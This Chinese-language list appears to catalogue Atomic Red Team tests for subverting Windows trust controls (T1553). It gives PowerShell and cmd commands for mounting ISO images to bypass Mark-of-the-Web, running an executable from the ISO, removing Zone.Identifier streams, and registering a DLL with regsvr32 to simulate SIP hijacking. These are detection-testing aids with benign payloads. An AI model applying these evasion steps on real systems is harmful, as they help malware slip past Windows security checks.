- **简介**: 挂载从互联网下载的 ISO 镜像以绕过 Web 标记（Mark-of-the-Web），并从 ISO 中运行 hello.exe 可执行文件。成功执行后，powershell 将从 Atomic Red Team 仓库下载 .iso，挂载镜像，并运行 ISO 镜像中的可执行文件，该文件将打开命令提示符并回显 "Hello, World!"。ISO 提供者：https://twitter.com/mattifestation/status/1398323532988399620 参考：https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,
- **平台/执行器**: windows/psh
- **依赖 payload**: 0f959a_FeelTheBurn.iso
- **执行脚本**:
`windows/psh`:
```
Mount-DiskImage -ImagePath "0f959a_FeelTheBurn.iso" -StorageType ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel "TestIso"; $driveLetter = ($keep | Get-Volume).DriveLetter; invoke-item "$($driveLetter):\hello.exe"
```

#### Mount ISO image
- **ID**: `3c9dee6c65974cc3b4f34d0a5d1b6992`
- **简介**: 挂载从互联网下载的 ISO 镜像以绕过 Web 标记（Mark-of-the-Web）。成功执行后，powershell 将从 Atomic Red Team 仓库下载 .iso 并挂载镜像。提供的示例 ISO 中仅包含一个 Reports 快捷方式文件。参考：https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/
- **平台/执行器**: windows/psh
- **依赖 payload**: 5fad3e_T1553.005.iso
- **执行脚本**:
`windows/psh`:
```
Mount-DiskImage -ImagePath "5fad3e_T1553.005.iso"
```

#### Remove the Zone.Identifier alternate data stream
- **ID**: `7f0f5471543a6f188b0fbdc436c49fd9`
- **简介**: 删除 Zone.Identifier 备用数据流，该数据流标识文件是从互联网下载的。删除此数据流可以更自由地在 PowerShell 中执行脚本，并避免在受保护的视图中打开文件。

### Subvert Trust Controls: SIP and Trust Provider Hijacking（T1553.003） — 1 个

#### SIP (Subject Interface Package) Hijacking via Custom DLL
- **ID**: `fa707f7c83967646f4a757f87aab375f`
- **简介**: 注册一个记录签名检查的 DLL，模拟 SIP 劫持。此测试使用来自 https://github.com/gtworek/PSBits/tree/master/SIP 的 DLL，并使用 regsvr32 将其注册，从而使系统在签名检查期间使用它，并记录所述检查。
- **平台/执行器**: windows/cmd
- **执行脚本**:
`windows/cmd`:
```
regsvr32.exe #{dll_payload}
```
